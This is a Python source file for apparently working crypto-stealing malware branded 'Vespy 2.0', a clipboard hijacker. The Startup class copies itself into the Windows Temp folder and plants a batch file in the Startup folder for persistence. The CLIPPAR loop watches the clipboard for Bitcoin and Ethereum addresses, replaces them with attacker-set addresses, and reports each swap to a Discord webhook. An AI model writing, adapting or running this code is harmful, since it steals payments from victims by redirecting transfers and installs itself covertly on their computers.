import sys, re
import getpass;user=getpass.getuser()
import os
from pyperclip import copy, paste
from time import sleep
from discord_webhook import DiscordWebhook, DiscordEmbed

class Startup:

        def __init__(self):
            self.file = sys.argv[0]
            ext = self.file.split("\\")[-1].split(".")[-1]
            name = self.file.split("\\")[-1].split(".")[0]
            self._startup(ext,name)

        def _startup(self,e,n):
            try:
                if os.path.exists(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}'):
                    if os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runn.bat"):
                        pass
                    else:
                        open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runn.bat","w+").write(fr"""start C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}""")
                else:
                    with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}', 'wb') as f:
                        f.write(open(self.file, 'rb').read())
                    open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runn.bat","w+").write(fr"""start C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}""")
            except:pass

class CLIPPAR:

        def __init__(self):
            self.BAYTEECEE = ""
            self.ETHH = ""
            self.__clap__()
        
        def __clap__(self):
            while True:
                sleep(1.2)
                p4ste = str(paste())
                btc_check = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", p4ste)
                btc_match = bool(btc_check)
                eth_check = re.match("^0x[a-zA-F0-9]{40}$", p4ste)
                eth_match = bool(eth_check)
                if btc_match:
                    if len(self.BAYTEECEE) > 1:
                        if p4ste == self.BAYTEECEE:
                            pass
                        else:
                            copy(self.BAYTEECEE)
                            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                            embed = DiscordEmbed(title=f"User : ``{user}``", description=f"Clipped user's BTC address", color='4300d1')
                            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                            embed.set_footer(text='Vespy 2.0 | by : vesper')
                            embed.set_timestamp()
                            webhook.add_embed(embed)
                            while True:
                                r=webhook.execute()
                                if r.status_code == 200 or r.status_code == 204:
                                    break
                                elif r.status_code == 429:
                                    sleep(10)
                                else:
                                    break
                if eth_match:
                    if len(self.ETHH) > 1:
                        if p4ste == self.ETHH:
                            pass
                        else:
                            copy(self.ETHH)
                            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                            embed = DiscordEmbed(title=f"User : ``{user}``", description=f"Clipped user's ETH address", color='4300d1')
                            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                            embed.set_footer(text='Vespy 2.0 | by : vesper')
                            embed.set_timestamp()
                            webhook.add_embed(embed)
                            while True:
                                r=webhook.execute()
                                if r.status_code == 200 or r.status_code == 204:
                                    break
                                elif r.status_code == 429:
                                    sleep(10)
                                else:
                                    break
Startup()
CLIPPAR()
